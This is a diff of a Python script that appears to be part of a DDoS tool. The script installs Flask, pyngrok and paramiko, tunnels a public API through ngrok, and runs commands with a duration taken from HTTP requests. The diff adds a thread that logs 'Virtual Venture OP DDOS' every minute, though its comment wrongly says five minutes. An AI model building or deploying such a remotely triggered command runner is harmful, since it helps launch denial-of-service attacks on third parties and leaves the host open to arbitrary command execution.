@@ -8,6 +8,17 @@ import time
 
 active_processes = {}
 
+# Set up logging
+logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')
+
+def log_message_periodically():
+    def periodic_logging():
+        while True: 
+            logging.info("Virtual Venture OP DDOS")
+            time.sleep(60)  # 5 minutes in seconds
+    thread = threading.Thread(target=periodic_logging, daemon=True)
+    thread.start()
+    
 def install_packages():
     required_packages = ['Flask', 'pyngrok', 'paramiko']
     for package in required_packages:
@@ -108,10 +119,11 @@ def run_flask_app():
         response = execute_command_async(command, int(duration))
         return jsonify(response)
 
-    print("Starting Flask server...")
+    logging.info("Starting VirtualVenture API Service...")
     app.run(host='0.0.0.0', port=5002)
 
 if __name__ == "__main__":
     install_packages()
     configure_ngrok()
+    log_message_periodically()
     run_flask_app()
